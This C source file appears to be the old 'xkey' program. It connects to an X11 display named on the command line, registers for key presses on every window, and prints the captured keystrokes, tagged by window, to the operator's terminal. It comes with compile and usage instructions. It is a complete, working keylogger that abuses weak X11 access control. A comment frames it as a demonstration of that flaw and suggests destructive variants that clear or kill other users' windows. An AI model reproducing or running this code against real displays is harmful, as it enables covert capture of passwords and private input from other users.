/* To compile, run it through your favorite ansi compiler something like
 * this :
 *
 *    gcc -o xkey xkey.c -lX11 -lm
 *
 * To run it, just use it like this :  xkey displayname:0
 * and watch as that display's keypresses show up in your shell window.
 *
 *    Dominic Giampaolo (nick@cs.maxine.wpi.edu)
 */
#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

char *TranslateKeyCode(XEvent *ev);
void dumpEvent(XKeyEvent *xke);

Window last_window;

Display *d;

void snoop_all_windows(Window root, unsigned long type)
{
  static int level = 0;
  Window parent, *children, *child2;
  unsigned int nchildren;
  int stat, i,j,k;

  level++;

  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
  if (stat == FALSE)
   {
     fprintf(stderr, "Can't query window tree...\n");
     return;
   }

  if (nchildren == 0)
    return;

  /* For a more drastic inidication of the problem being exploited
   * here, you can change these calls to XSelectInput() to something
   * like XClearWindow(d, children[i]) or if you want to be real
   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
   * then you'll want to remove the loop in main().
   *
   * The whole point of this exercise being that I shouldn't be
   * allowed to manipulate resources which do not belong to me.
   */
  XSelectInput(d, root, type);

  for(i=0; i < nchildren; i++)
   {
     XSelectInput(d, children[i], type);
     snoop_all_windows(children[i], type);
   }

  XFree((char *)children);
}


void main(int argc, char **argv)
{
  char *hostname;
  char *string;
  XEvent xev;
  int count = 0;

  if (argv[1] == NULL)
    hostname = ":0";
  else
    hostname = argv[1];

  d = XOpenDisplay(hostname);
  if (d == NULL)
   {
     fprintf(stderr, "Blah, can't open display: %s\n", hostname);
     exit(10);
   }

  snoop_all_windows(DefaultRootWindow(d), KeyPressMask);

  while(1)
   {
     XNextEvent(d, &xev);

     string = TranslateKeyCode(&xev);
     if (string == NULL)
       continue;

     if (*string == '\r')
       printf("\n");
     else if (strlen(string) == 1)
       printf("%s", string);
     else
       printf("<<%s>>", string);
     fflush(stdout);
   }
}


#define KEY_BUFF_SIZE 256
static char key_buff[KEY_BUFF_SIZE];

char *TranslateKeyCode(XEvent *ev)
{
  int count;
  char *tmp;
  KeySym ks;
  Window current_window;

  if (ev)
   {
	 XKeyEvent *xke=(XKeyEvent *)ev;
	 /* dumpEvent(xke); */
	 current_window=xke->window;
	 if(current_window != last_window) {
		printf("\nNew Window:  %u\n", current_window);
		last_window=current_window;
	 }
     count = XLookupString(xke, key_buff, KEY_BUFF_SIZE, &ks,NULL);
     key_buff[count] = '\0';

     if (count == 0)
      {
        tmp = XKeysymToString(ks);
        if (tmp)
          strcpy(key_buff, tmp);
        else
          strcpy(key_buff, "");
      }

     return key_buff;
   }
  else
    return NULL;
}

#define _dump(a) printf("%s:  %u\n", #a, xke->a);

void dumpEvent(XKeyEvent *xke)
{
	printf("\n--------------------------------------------\n");
	_dump(type);
	_dump(serial);
	_dump(send_event);
	_dump(display);
	_dump(window);
	_dump(root);
	_dump(subwindow);
	_dump(time);
	_dump(x);
	_dump(y);
	_dump(x_root);
	_dump(y_root);
	_dump(state);
	_dump(keycode);
	_dump(same_screen);
}
